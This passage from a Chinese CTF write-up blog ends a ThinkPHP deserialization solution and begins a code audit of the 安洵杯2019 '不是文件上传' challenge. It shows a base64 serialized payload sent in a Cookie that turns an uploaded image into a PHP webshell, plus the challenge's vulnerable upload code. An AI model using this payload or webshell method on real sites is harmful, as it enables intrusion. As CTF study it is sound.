gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Tzoy<span class="hljs-symbol">NzoiYXBwXHdlYlxjb250</span>c<span class="hljs-name">m9</span>sbGVyXFJlZ<span class="hljs-number">2</span>lzdGVyIjoyO<span class="hljs-symbol">ntzOjc6</span>Im<span class="hljs-symbol">NoZWNrZXIiO086</span>MjY<span class="hljs-number">6</span>ImFwcFx<span class="hljs-number">3</span>ZWJcY<span class="hljs-number">29</span>udHJvbGxlclxQc<span class="hljs-name">m9</span>maWxlIj<span class="hljs-meta">o3</span>O<span class="hljs-symbol">ntzOjc6</span>Im<span class="hljs-symbol">NoZWNrZXIiO047</span>czoxMjoiZmlsZW<span class="hljs-number">5</span>hbWVfd<span class="hljs-name">G1</span>wIjtzOjc<span class="hljs-number">4</span>OiIuL<span class="hljs-number">3</span>Vwb<span class="hljs-name">G9</span>hZC<span class="hljs-number">83</span><span class="hljs-symbol">NmQ5</span>ZjAw<span class="hljs-symbol">NDY3</span>ZTVlZTZhYmMzY<span class="hljs-number">2</span>E<span class="hljs-number">2</span>MD<span class="hljs-name">g5</span>MmVmMzA<span class="hljs-number">0</span>ZS<span class="hljs-number">8</span>xOTA<span class="hljs-number">1</span>ZTMyOTczMThlMDdm<span class="hljs-symbol">Njg5</span>ZWVkYT<span class="hljs-symbol">NhZmI3</span>OWRj<span class="hljs-symbol">Ny5</span>wbmci<span class="hljs-meta">O3</span><span class="hljs-name">M6</span>ODoiZmlsZW<span class="hljs-number">5</span>hbWUi<span class="hljs-meta">O3</span><span class="hljs-name">M6</span><span class="hljs-symbol">Nzg6</span>Ii<span class="hljs-number">4</span>vdXBsb<span class="hljs-number">2</span>FkLzc<span class="hljs-number">2</span>ZDlmMDA<span class="hljs-number">0</span><span class="hljs-symbol">NjdlNWVlNmFiYzNjYTYwODkyZWYzMDRlLzE5</span>MDVlMzI<span class="hljs-number">5</span><span class="hljs-symbol">NzMxOGUwN2</span>Y<span class="hljs-number">2</span>ODllZWRh<span class="hljs-name">M2</span>FmYjc<span class="hljs-number">5</span>ZG<span class="hljs-name">M3</span>L<span class="hljs-symbol">nBocCI7</span>czoxMToidXBsb<span class="hljs-number">2</span>FkX<span class="hljs-number">21</span>lb<span class="hljs-symbol">nUiO047</span>czozOiJleHQi<span class="hljs-meta">O3</span><span class="hljs-name">M6</span>Mzoic<span class="hljs-name">G5</span><span class="hljs-symbol">nIjtzOjM6</span>ImltZyI<span class="hljs-number">7</span>czoxMDoidXBsb<span class="hljs-number">2</span>FkX<span class="hljs-number">2</span>ltZyI<span class="hljs-number">7</span>cz<span class="hljs-meta">o2</span>OiJleG<span class="hljs-symbol">NlcHQiO2</span>E<span class="hljs-number">6</span>MTp<span class="hljs-number">7</span>cz<span class="hljs-meta">o1</span>OiJpbmRleCI<span class="hljs-number">7</span>czozOiJpbWci<span class="hljs-meta">O319</span>cz<span class="hljs-meta">o4</span>OiJyZWdpc<span class="hljs-number">3</span>RlZCI<span class="hljs-number">7</span>Yjow<span class="hljs-meta">O30</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>先上传我们的1.png文件，注意要用GIF89a头才能绕过。然后在查看网页源码找到我们上传的文件路径，修改poc中的文件路径。</p><p>然后将得到的payload，在上传文件后的页面传入Cookie</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Cookie：user=Tzoy<span class="hljs-symbol">NzoiYXBwXHdlYlxjb250</span>c<span class="hljs-name">m9</span>sbGVyXFJlZ<span class="hljs-number">2</span>lzdGVyIjoyO<span class="hljs-symbol">ntzOjc6</span>Im<span class="hljs-symbol">NoZWNrZXIiO086</span>MjY<span class="hljs-number">6</span>ImFwcFx<span class="hljs-number">3</span>ZWJcY<span class="hljs-number">29</span>udHJvbGxlclxQc<span class="hljs-name">m9</span>maWxlIj<span class="hljs-meta">o3</span>O<span class="hljs-symbol">ntzOjc6</span>Im<span class="hljs-symbol">NoZWNrZXIiO047</span>czoxMjoiZmlsZW<span class="hljs-number">5</span>hbWVfd<span class="hljs-name">G1</span>wIjtzOjc<span class="hljs-number">4</span>OiIuL<span class="hljs-number">3</span>Vwb<span class="hljs-name">G9</span>hZC<span class="hljs-number">83</span><span class="hljs-symbol">NmQ5</span>ZjAw<span class="hljs-symbol">NDY3</span>ZTVlZTZhYmMzY<span class="hljs-number">2</span>E<span class="hljs-number">2</span>MD<span class="hljs-name">g5</span>MmVmMzA<span class="hljs-number">0</span>ZS<span class="hljs-number">8</span>xOTA<span class="hljs-number">1</span>ZTMyOTczMThlMDdm<span class="hljs-symbol">Njg5</span>ZWVkYT<span class="hljs-symbol">NhZmI3</span>OWRj<span class="hljs-symbol">Ny5</span>wbmci<span class="hljs-meta">O3</span><span class="hljs-name">M6</span>ODoiZmlsZW<span class="hljs-number">5</span>hbWUi<span class="hljs-meta">O3</span><span class="hljs-name">M6</span><span class="hljs-symbol">Nzg6</span>Ii<span class="hljs-number">4</span>vdXBsb<span class="hljs-number">2</span>FkLzc<span class="hljs-number">2</span>ZDlmMDA<span class="hljs-number">0</span><span class="hljs-symbol">NjdlNWVlNmFiYzNjYTYwODkyZWYzMDRlLzE5</span>MDVlMzI<span class="hljs-number">5</span><span class="hljs-symbol">NzMxOGUwN2</span>Y<span class="hljs-number">2</span>ODllZWRh<span class="hljs-name">M2</span>FmYjc<span class="hljs-number">5</span>ZG<span class="hljs-name">M3</span>L<span class="hljs-symbol">nBocCI7</span>czoxMToidXBsb<span class="hljs-number">2</span>FkX<span class="hljs-number">21</span>lb<span class="hljs-symbol">nUiO047</span>czozOiJleHQi<span class="hljs-meta">O3</span><span class="hljs-name">M6</span>Mzoic<span class="hljs-name">G5</span><span class="hljs-symbol">nIjtzOjM6</span>ImltZyI<span class="hljs-number">7</span>czoxMDoidXBsb<span class="hljs-number">2</span>FkX<span class="hljs-number">2</span>ltZyI<span class="hljs-number">7</span>cz<span class="hljs-meta">o2</span>OiJleG<span class="hljs-symbol">NlcHQiO2</span>E<span class="hljs-number">6</span>MTp<span class="hljs-number">7</span>cz<span class="hljs-meta">o1</span>OiJpbmRleCI<span class="hljs-number">7</span>czozOiJpbWci<span class="hljs-meta">O319</span>cz<span class="hljs-meta">o4</span>OiJyZWdpc<span class="hljs-number">3</span>RlZCI<span class="hljs-number">7</span>Yjow<span class="hljs-meta">O30</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>然后访问<code>url/upload/76d9f00467e5ee6abc3ca60892ef304e/1905e3297318e07f689eeda3afb79dc7.php</code></p><p>发现成功解析我们的一句话木马，然后用蚁剑连接在根目录下找到flag。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> tp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯2019-不是文件上传</title>
      <link href="/2025/04/29/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2025/04/29/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="安洵杯2019-不是文件上传"><a href="#安洵杯2019-不是文件上传" class="headerlink" title="安洵杯2019-不是文件上传"></a>安洵杯2019-不是文件上传</h1><p>原文链接：<a href="https://blog.csdn.net/weixin_45642610/article/details/119463045">https://blog.csdn.net/weixin_45642610/article/details/119463045</a></p><p>首先打开页面。</p><p><img src="/../image/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-1.png"></p><p>这里有点犟种了，他题目说了不是文件上传，我硬是试了半天。然后说是要看源码。github上把源码下下来</p><p>代码审计</p><p>upload.php</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Image Upload<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./style.css&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>/&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://i.loli.net/2019/10/06/i5GVSYnB1mZRaFj.png&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">300</span> <span class="hljs-attr">length</span>=<span class="hljs-string">150</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;upload&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span>  <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span> =<span class="hljs-string">&quot;multipart/form-data&quot;</span> &gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;Submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./show.php&quot;</span>&gt;</span>You can view the pictures you uploaded here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./helper.php&quot;</span>);</span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">upload</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">helper</span> </span>&#123;</span><br><span class="language-php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_base</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php"><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>();</span><br><span class="language-php">&#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>)&#123;</span><br><span class="language-php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>])&#123;</span><br><span class="language-php"><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file failed.&quot;</span>);</span><br><span class="language-php">&#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php"><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">upload</span>();</span><br><span class="language-php"><span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">upload_base</span>();</span><br><span class="language-php">&#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">helper</span>();</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><p>show.php</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Show Images<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./style.css&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>/&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span>Your images<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>The function of viewing the image has not been completed, and currently only the contents of your image name can be saved. I hope you can forgive me and my colleagues and I are working hard to improve.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./helper.php&quot;</span>);</span><br><span class="language-php"><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">show</span>();</span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;delete_all&quot;</span>])&#123;</span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;delete_all&quot;</span>] == <span class="hljs-string">&quot;true&quot;</span>)&#123;</span><br><span class="language-php"><span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">Delete_All_Images</span>();</span><br><span class="language-php">&#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">Get_All_Images</span>();</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">show</span></span>&#123;</span><br><span class="language-php"><span class="hljs-keyword">public</span> <span class="hljs-variable">$con</span>;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php"><span class="hljs-variable language_">$this</span>-&gt;con = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);</span><br><span class="language-php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>(<span class="hljs-variable">$this</span>-&gt;con))&#123; </span><br><span class="language-php">   <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="language-php">&#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get_All_Images</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM images&quot;</span>;</span><br><span class="language-php"><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$this</span>-&gt;con, <span class="hljs-variable">$sql</span>);</span><br><span class="language-php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;</span><br><span class="language-php">    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>())&#123;</span><br><span class="language-php">    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>])&#123;</span><br><span class="language-php">    <span class="hljs-variable">$attr_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>]);</span><br><span class="language-php"><span class="hljs-variable">$attr</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$attr_temp</span>);</span><br><span class="language-php">&#125;</span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;id=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>].<span class="hljs-string">&quot; filename=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;filename&quot;</span>].<span class="hljs-string">&quot; path=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$this</span>-&gt;con);</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Delete_All_Images</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;DELETE FROM images&quot;</span>;</span><br><span class="language-php"><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$this</span>-&gt;con, <span class="hljs-variable">$sql</span>);</span><br><span class="language-php">&#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;show.php?delete_all=true&quot;</span>&gt;</span>Delete All Images<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;upload.php&quot;</span>&gt;</span>Upload Images<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><p>helper.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 定义一个名为 helper 的类，用于处理图片上传和相关操作</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;<br>    <span class="hljs-comment">// 定义一个受保护的属性 $folder，用于存储上传图片的文件夹路径</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$folder</span> = <span class="hljs-string">&quot;pic/&quot;</span>;<br>    <span class="hljs-comment">// 定义一个受保护的属性 $ifview，用于控制文件查看功能是否可用，初始值为 False</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = False;<br>    <span class="hljs-comment">// 定义一个受保护的属性 $config，用于指定配置文件的名称</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;config.txt&quot;</span>;<br>    <span class="hljs-comment">// 注释说明该类中的某些功能还不完善，尚未开放</span><br> <br>    <span class="hljs-comment">// 定义一个公共方法 upload，用于处理图片上传操作，默认表单文件字段名为 &quot;file&quot;</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$input</span>=<span class="hljs-string">&quot;file&quot;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 调用 getfile 方法获取上传文件的相关信息</span><br>        <span 